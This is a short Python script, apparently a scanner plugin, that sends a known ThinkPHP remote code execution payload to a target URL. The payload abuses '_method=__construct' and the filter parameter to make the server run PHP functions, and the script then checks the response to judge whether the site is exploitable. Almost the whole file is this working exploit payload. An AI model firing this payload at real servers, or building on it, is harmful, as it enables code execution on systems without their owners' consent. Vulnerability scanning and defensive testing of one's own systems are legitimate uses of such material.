#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
__author__ = "bakabie"
code = 'server[]=die()&get[]=printf(1);&_method=__construct&filter[]=var_dump'


def check(url):
    res = requests.get(url, data=code).text.encode("utf-8")
    if res.find("printf(1)") != -1:
        return True
    else:
        return False


def initialization():
    return "thinkphp_reqeust_code_exec_1", {
        "callback": check,
        "language": "php",
        "what_cms": "thinkphp"
    }
